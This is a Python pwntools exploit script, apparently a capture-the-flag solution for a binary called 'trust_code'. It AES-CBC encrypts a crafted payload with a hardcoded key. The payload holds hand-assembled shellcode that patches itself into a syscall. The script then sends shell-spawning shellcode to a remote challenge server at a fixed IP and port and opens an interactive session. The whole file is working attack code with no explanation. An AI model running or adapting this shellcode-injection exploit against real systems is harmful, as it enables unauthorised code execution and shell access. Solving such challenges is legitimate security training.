#!/usr/bin/python

from pwn import *
import sys
from Crypto.Cipher import AES

remote_ip, port = '35.190.227.47', 10009
binary = './trust_code'
brkpts = '''
b*0x555555555589
c
'''

elf = ELF("trust_code")

context.terminal = ['tmux', 'splitw', '-h']
context.arch = "amd64"
context.log_level = "debug"
context.aslr = False

re = lambda a: io.recv(a)
reu = lambda a: io.recvuntil(a)
rl = lambda: io.recvline()
s = lambda a: io.send(a)
sl = lambda a: io.sendline(a)
sla = lambda a,b: io.sendlineafter(a,b)
sa = lambda a,b: io.sendafter(a,b)

uu64 = lambda a: u64(a.ljust(8, chr(0)))

if len(sys.argv) > 1 and sys.argv[1] == "-r":
    io = remote(remote_ip, port)
    context.noptrace = True

elif len(sys.argv) > 1:
    io = gdb.debug(binary, brkpts)

else:
    io = process(binary)

def cbc_encrypt(key, iv, message):
    ct = AES.new(key,AES.MODE_CBC,iv)
    return ct.encrypt(message)

def cbc_decrypt(key, iv, ciphertext):
    pt = AES.new(key,AES.MODE_CBC,iv)
    return pt.decrypt(ciphertext)

if __name__ == "__main__":
    iv = "b"*0x10
    sa("iv> ", iv)
    key = "v0nVadznhxnv$nph"
    msg = "TRUST_CODE_ONLY!"
    shellcode = asm("""
        push rsi
        pop rdx
        pop rbx
        pop rbx
        pop rbx
        push rbx
        pop rsi
        xor eax, eax
        add rbx, 0x13
        xor DWORD PTR [rbx], 0x101
    """)
    shellcode += "\x0e\x04"
    msg += shellcode
    print(len(msg))
    msg = msg.ljust(0x30, "\x90")
    encrypted = cbc_encrypt(key, iv, msg)
    sa("code> ", encrypted)

    sl("\x90"*0x20 + asm(shellcraft.sh()))
    io.interactive()
